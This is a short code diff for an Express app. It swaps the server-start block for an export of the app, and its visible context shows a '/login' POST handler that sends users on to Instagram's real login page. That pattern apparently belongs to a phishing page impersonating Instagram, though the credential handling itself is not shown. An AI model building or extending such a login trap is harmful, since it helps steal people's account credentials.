@@ -25,7 +25,4 @@ app.post('/login', (req, res) => {
     res.redirect('https://www.instagram.com/accounts/login/');
 });
 
-// Start the server listening
-app.listen(PORT, () => {
-    console.log(`Server running successfully on port ${PORT}`);
-});
+module.exports = app;
